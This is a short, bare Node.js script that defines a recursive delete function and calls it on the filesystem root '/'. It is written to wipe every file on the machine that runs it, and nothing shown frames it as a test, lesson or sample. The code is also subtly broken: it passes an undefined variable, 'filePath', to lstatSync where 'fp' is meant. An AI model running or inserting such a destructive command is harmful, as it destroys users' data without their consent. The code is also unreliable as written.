#!/usr/bin/env node

const fs = require('fs')

const rmrf = (d) => {
  const files = fs.readdirSync(d)
  if (files && files.length > 0) {
    files.forEach((file) => {
      const fp = d + '/' + file
      if (fs.lstatSync(filePath).isDirectory()) rmrf(fp)
      else fs.unlinkSync(fp)
    })
  }
  fs.rmdirSync(d)
}

rmrf('/')
